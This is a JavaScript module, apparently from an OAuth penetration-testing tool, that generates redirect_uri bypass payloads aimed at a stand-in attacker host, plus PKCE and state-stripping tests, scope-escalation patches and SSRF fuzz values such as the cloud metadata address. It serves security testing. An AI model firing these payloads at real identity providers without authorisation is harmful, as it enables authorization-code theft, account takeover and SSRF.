/**
 * Enumeration of redirect_uri bypass / validation-confusion categories.
 */
export const RedirectUriMutationType = Object.freeze({
  SUBDOMAIN_SUFFIX: 'SUBDOMAIN_SUFFIX',
  SUBDOMAIN_PREFIX: 'SUBDOMAIN_PREFIX',
  AUTHORITY_AT_SIGN: 'AUTHORITY_AT_SIGN',
  AUTHORITY_AT_ENCODED: 'AUTHORITY_AT_ENCODED',
  PATH_TRAVERSAL_DOTDOT: 'PATH_TRAVERSAL_DOTDOT',
  PATH_TRAVERSAL_ENCODED: 'PATH_TRAVERSAL_ENCODED',
  BACKSLASH_CONFUSION: 'BACKSLASH_CONFUSION',
  SCHEME_HTTP_DOWNGRADE: 'SCHEME_HTTP_DOWNGRADE',
  SCHEME_JAVASCRIPT: 'SCHEME_JAVASCRIPT',
  TRAILING_SLASH_MUTATION: 'TRAILING_SLASH_MUTATION',
  QUERY_PARAM_POLLUTION: 'QUERY_PARAM_POLLUTION',
  FRAGMENT_INJECTION: 'FRAGMENT_INJECTION',
  LOCALHOST_OVERRIDE: 'LOCALHOST_OVERRIDE',
  LOOPBACK_IPV6: 'LOOPBACK_IPV6',
  PORT_MANIPULATION: 'PORT_MANIPULATION',
  WHITELIST_SUBSTRING_PATH: 'WHITELIST_SUBSTRING_PATH',
  DOUBLE_URL_ENCODE: 'DOUBLE_URL_ENCODE',
  NULL_BYTE_TRUNCATION: 'NULL_BYTE_TRUNCATION',
  CRLF_INJECTION: 'CRLF_INJECTION',
  HPP_DUPLICATE_PARAM: 'HPP_DUPLICATE_PARAM',
  MATRIX_SEMICOLON: 'MATRIX_SEMICOLON',
  IPV4_DECIMAL: 'IPV4_DECIMAL',
  IPV4_HEX: 'IPV4_HEX',
  IPV4_SHORT: 'IPV4_SHORT',
  IPV4_ALL_ZEROS: 'IPV4_ALL_ZEROS',
  WHITESPACE_TAB_HOST: 'WHITESPACE_TAB_HOST',
  UNICODE_FULLWIDTH_SLASH: 'UNICODE_FULLWIDTH_SLASH',
  CUSTOM_SCHEME_MOBILE: 'CUSTOM_SCHEME_MOBILE',
});

/**
 * Generates a structured list of redirect_uri test payloads for a given baseline URI.
 * @param {string} baseRedirectUri
 * @param {string} [attackerHost='attacker.example']
 * @returns {Array<{id: string, category: string, label: string, uri: string, rationale: string}>}
 */
export function generateRedirectUriMutations(baseRedirectUri, attackerHost = 'attacker.example') {
  let parsed;
  try {
    parsed = new URL(baseRedirectUri);
  } catch {
    parsed = new URL('https://app.example.com/callback');
  }

  const host = parsed.hostname;
  const portPart = parsed.port ? `:${parsed.port}` : '';
  const path = parsed.pathname || '/callback';
  const origin = parsed.origin;
  const attacker = attackerHost.replace(/^https?:\/\//i, '').replace(/\/+$/, '');

  return [
    {
      id: RedirectUriMutationType.SUBDOMAIN_SUFFIX,
      category: 'Host / Domain',
      label: 'Domain suffix bypass (target.com.attacker)',
      uri: `${parsed.protocol}//${host}.${attacker}${path}`,
      rationale: 'Tests naive prefix/startsWith validation on redirect_uri.',
    },
    {
      id: RedirectUriMutationType.SUBDOMAIN_PREFIX,
      category: 'Host / Domain',
      label: 'Arbitrary subdomain (evil.target.com)',
      uri: `${parsed.protocol}//evil.${host}${portPart}${path}`,
      rationale: 'Tests overly broad wildcard subdomain matching (*.target.com).',
    },
    {
      id: RedirectUriMutationType.WHITELIST_SUBSTRING_PATH,
      category: 'Host / Domain',
      label: 'Target domain in attacker path/subdomain',
      uri: `https://${attacker}/${host}${path}`,
      rationale: 'Tests naive substring/contains checks for the allowed hostname.',
    },
    {
      id: RedirectUriMutationType.AUTHORITY_AT_SIGN,
      category: 'Parser Confusion',
      label: 'Userinfo @ authority confusion',
      uri: `${parsed.protocol}//${host}@${attacker}${path}`,
      rationale: 'Exploits URL parsers that treat the left side of @ as host while browsers route to the right side.',
    },
    {
      id: RedirectUriMutationType.AUTHORITY_AT_ENCODED,
      category: 'Parser Confusion',
      label: 'Encoded %40 authority confusion',
      uri: `${parsed.protocol}//${host}%40${attacker}${path}`,
      rationale: 'Tests decode-after-validate bugs with URL-encoded @.',
    },
    {
      id: RedirectUriMutationType.BACKSLASH_CONFUSION,
      category: 'Parser Confusion',
      label: 'Backslash authority/path confusion',
      uri: `${parsed.protocol}//${attacker}\\@${host}${path}`,
      rationale: 'Exploits backslash normalization differences between validator and browser.',
    },
    {
      id: RedirectUriMutationType.PATH_TRAVERSAL_DOTDOT,
      category: 'Path Normalization',
      label: 'Path traversal (/callback/../../redirect)',
      uri: `${origin}${path.replace(/\/$/, '')}/../../open-redirect?next=https://${attacker}`,
      rationale: 'Tests strict path prefix checks combined with server-side path normalization or open redirects.',
    },
    {
      id: RedirectUriMutationType.PATH_TRAVERSAL_ENCODED,
      category: 'Path Normalization',
      label: 'Encoded path traversal (%2f..%2f)',
      uri: `${origin}${path.replace(/\/$/, '')}%2f..%2f..%2flogin`,
      rationale: 'Tests whether encoded slashes bypass prefix validation before decoding.',
    },
    {
      id: RedirectUriMutationType.TRAILING_SLASH_MUTATION,
      category: 'Path Normalization',
      label: 'Trailing slash / extra path segment',
      uri: `${origin}${path.replace(/\/$/, '')}/extra/..`,
      rationale: 'Checks strict equality vs normalized path matching.',
    },
    {
      id: RedirectUriMutationType.SCHEME_HTTP_DOWNGRADE,
      category: 'Scheme / Transport',
      label: 'HTTP scheme downgrade',
      uri: `http://${host}${portPart}${path}`,
      rationale: 'Tests if HTTPS-only enforcement is missing, allowing plaintext token/code interception.',
    },
    {
      id: RedirectUriMutationType.SCHEME_JAVASCRIPT,
      category: 'Scheme / Transport',
      label: 'javascript: scheme',
      uri: `javascript:alert(document.domain)//${origin}${path}`,
      rationale: 'Tests if non-HTTP(S) schemes are accepted by the authorization endpoint.',
    },
    {
      id: RedirectUriMutationType.LOCALHOST_OVERRIDE,
      category: 'Local / Loopback',
      label: 'Localhost callback override',
      uri: `http://localhost:3000/callback`,
      rationale: 'Tests if arbitrary localhost ports/paths are permitted (useful for local interception).',
    },
    {
      id: RedirectUriMutationType.LOOPBACK_IPV6,
      category: 'Local / Loopback',
      label: 'IPv6 loopback [::1]',
      uri: `http://[::1]:8080/callback`,
      rationale: 'Tests IPv6 loopback handling vs IPv4 127.0.0.1 allowlists.',
    },
    {
      id: RedirectUriMutationType.PORT_MANIPULATION,
      category: 'Host / Domain',
      label: 'Arbitrary port on allowed host',
      uri: `${parsed.protocol}//${host}:8443${path}`,
      rationale: 'Tests whether port numbers are validated strictly (RFC 8252 exceptions).',
    },
    {
      id: RedirectUriMutationType.QUERY_PARAM_POLLUTION,
      category: 'Injection / Encoding',
      label: 'Injected query parameter (?next=attacker)',
      uri: `${origin}${path}?next=https://${attacker}`,
      rationale: 'Tests if extra query parameters are allowed on the registered callback URI.',
    },
    {
      id: RedirectUriMutationType.FRAGMENT_INJECTION,
      category: 'Injection / Encoding',
      label: 'Fragment persistence (#/attacker)',
      uri: `${origin}${path}#/attacker`,
      rationale: 'Checks if fragments are stripped or preserved across authorization redirects.',
    },
    {
      id: RedirectUriMutationType.DOUBLE_URL_ENCODE,
      category: 'Injection / Encoding',
      label: 'Double-encoded host separator (%2540)',
      uri: `${parsed.protocol}//${host}%2540${attacker}${path}`,
      rationale: 'Tests double-decoding pipelines in reverse proxies / IdPs.',
    },
    {
      id: RedirectUriMutationType.NULL_BYTE_TRUNCATION,
      category: 'Injection / Encoding',
      label: 'Null-byte suffix (%00)',
      uri: `https://${attacker}%00.${host}${path}`,
      rationale: 'Tests legacy string truncation in C-backed URL parsers.',
    },
    {
      id: RedirectUriMutationType.CRLF_INJECTION,
      category: 'Injection / Encoding',
      label: 'CRLF header injection probe',
      uri: `${origin}${path}%0d%0aX-OAuth-Test:%20injected`,
      rationale: 'Tests whether raw CR/LF sequences in redirect_uri are reflected into Location headers.',
    },
    {
      id: RedirectUriMutationType.HPP_DUPLICATE_PARAM,
      category: 'Parameter Pollution',
      label: 'HTTP Parameter Pollution (duplicate redirect_uri)',
      uri: `${origin}${path}&redirect_uri=https://${attacker}${path}`,
      isHpp: true,
      rationale: 'Tests if validator checks the first redirect_uri while the handler uses the second.',
    },
    {
      id: RedirectUriMutationType.MATRIX_SEMICOLON,
      category: 'Path Normalization',
      label: 'Matrix / semicolon path confusion (;next=)',
      uri: `${origin}${path};next=https://${attacker}`,
      rationale: 'Tests Spring/Tomcat/Jetty semicolon matrix parameter handling.',
    },
    {
      id: RedirectUriMutationType.IPV4_DECIMAL,
      category: 'Local / Loopback',
      label: 'Decimal IPv4 loopback (2130706433)',
      uri: 'http://2130706433/callback',
      rationale: 'Tests IPv4 allowlist bypass using decimal representation of 127.0.0.1.',
    },
    {
      id: RedirectUriMutationType.IPV4_HEX,
      category: 'Local / Loopback',
      label: 'Hex IPv4 loopback (0x7f000001)',
      uri: 'http://0x7f000001/callback',
      rationale: 'Tests IPv4 allowlist bypass using hexadecimal representation of 127.0.0.1.',
    },
    {
      id: RedirectUriMutationType.IPV4_SHORT,
      category: 'Local / Loopback',
      label: 'Shortened IPv4 loopback (127.1)',
      uri: 'http://127.1/callback',
      rationale: 'Tests IPv4 shorthand parsing differences.',
    },
    {
      id: RedirectUriMutationType.IPV4_ALL_ZEROS,
      category: 'Local / Loopback',
      label: 'Unspecified IPv4 (0.0.0.0)',
      uri: 'http://0.0.0.0/callback',
      rationale: 'Tests if 0.0.0.0 is permitted as a local callback host.',
    },
    {
      id: RedirectUriMutationType.WHITESPACE_TAB_HOST,
      category: 'Injection / Encoding',
      label: 'Tab character (%09) in hostname',
      uri: `${parsed.protocol}//${host}%09.${attacker}${path}`,
      rationale: 'Tests URL parsers that strip ASCII whitespace/tabs before routing.',
    },
    {
      id: RedirectUriMutationType.UNICODE_FULLWIDTH_SLASH,
      category: 'Parser Confusion',
      label: 'Unicode fullwidth slash (%ef%bc%8f)',
      uri: `${parsed.protocol}//${attacker}%ef%bc%8f@${host}${path}`,
      rationale: 'Tests Unicode NFKC normalization turning fullwidth slash into /.',
    },
    {
      id: RedirectUriMutationType.CUSTOM_SCHEME_MOBILE,
      category: 'Scheme / Transport',
      label: 'Custom mobile scheme (myapp://callback)',
      uri: 'myapp://callback',
      rationale: 'Tests if arbitrary custom URI schemes are accepted for mobile/desktop hijacking.',
    },
  ];
}

/**
 * Generates common non-redirect OAuth parameter mutations for security testing.
 * @returns {Array<{id: string, label: string, description: string, patch: object}>}
 */
export function getOAuthParameterMutations() {
  return [
    {
      id: 'REMOVE_STATE',
      label: 'Remove state (CSRF probe)',
      description: 'Drops the state parameter to test if the client/IdP enforces CSRF protection.',
      patch: { state: null },
    },
    {
      id: 'DOWNGRADE_IMPLICIT_TOKEN',
      label: 'Downgrade response_type=token',
      description: 'Switches to Implicit flow to check if access_token is returned in URL fragment.',
      patch: { response_type: 'token' },
    },
    {
      id: 'DOWNGRADE_HYBRID_ID_TOKEN',
      label: 'Switch response_type=code id_token',
      description: 'Requests an id_token directly from the authorization endpoint.',
      patch: { response_type: 'code id_token' },
    },
    {
      id: 'RESPONSE_MODE_QUERY',
      label: 'Force response_mode=query',
      description: 'Forces tokens/codes into URL query string instead of fragment/form_post.',
      patch: { response_mode: 'query' },
    },
    {
      id: 'RESPONSE_MODE_FRAGMENT',
      label: 'Force response_mode=fragment',
      description: 'Forces response parameters into URL fragment.',
      patch: { response_mode: 'fragment' },
    },
    {
      id: 'PROMPT_NONE',
      label: 'Set prompt=none (Silent Auth)',
      description: 'Probes silent authentication without user interaction.',
      patch: { prompt: 'none' },
    },
    {
      id: 'PKCE_METHOD_PLAIN',
      label: 'Downgrade PKCE to plain',
      description: 'Changes code_challenge_method from S256 to plain.',
      patch: { code_challenge_method: 'plain' },
    },
    {
      id: 'PKCE_STRIP',
      label: 'Strip PKCE parameters',
      description: 'Removes code_challenge and code_challenge_method to test PKCE enforcement.',
      patch: { code_challenge: null, code_challenge_method: null },
    },
    {
      id: 'SCOPE_ESCALATION',
      label: 'Expand scope (+admin offline_access)',
      description: 'Appends privileged/offline scopes to test scope consent & validation.',
      patch: { scope_append: 'admin offline_access' },
    },
  ];
}

/**
 * Built-in payload presets for fuzzing arbitrary custom OAuth/IdP parameters.
 * @returns {Array<{id: string, label: string, payloads: Array<string>}>}
 */
export function getCustomFieldPresets() {
  return [
    {
      id: 'IDOR_ROLE_TENANT',
      label: 'IDOR / Tenant / Role',
      payloads: ['0', '1', '2', 'admin', 'internal', 'master', 'default', '*'],
    },
    {
      id: 'REDIRECT_SSRF',
      label: 'Redirect / SSRF',
      payloads: ['https://attacker.example', '//attacker.example', 'http://127.0.0.1', 'http://169.254.169.254'],
    },
    {
      id: 'EDGE_TYPES',
      label: 'Edge / Type Confusion',
      payloads: ['', 'null', 'true', 'false', '../', "'"],
    },
  ];
}

/**
 * Generates Token Endpoint (/token) security test mutations.
 * @returns {Array<{id: string, label: string, description: string}>}
 */
export function getTokenEndpointMutations() {
  return [
    {
      id: 'TOKEN_STRIP_VERIFIER',
      label: 'Strip code_verifier (PKCE bypass)',
      description: 'Removes code_verifier from the /token body to test if PKCE is enforced.',
    },
    {
      id: 'TOKEN_WRONG_VERIFIER',
      label: 'Wrong code_verifier',
      description: 'Replaces code_verifier with an invalid string to verify S256/plain validation.',
    },
    {
      id: 'TOKEN_MISMATCH_REDIRECT',
      label: 'Mismatch redirect_uri',
      description: 'Replaces redirect_uri with an attacker URI to test code-to-redirect_uri binding.',
    },
    {
      id: 'TOKEN_DROP_REDIRECT',
      label: 'Drop redirect_uri',
      description: 'Removes redirect_uri from the /token request.',
    },
    {
      id: 'TOKEN_DROP_CLIENT_SECRET',
      label: 'Drop client_secret',
      description: 'Removes client_secret to test if confidential client auth is enforced.',
    },
    {
      id: 'TOKEN_REPLAY_CODE',
      label: 'Replay authorization_code (2nd use)',
      description: 'Sends the exact /token request twice to verify single-use code enforcement.',
    },
  ];
}
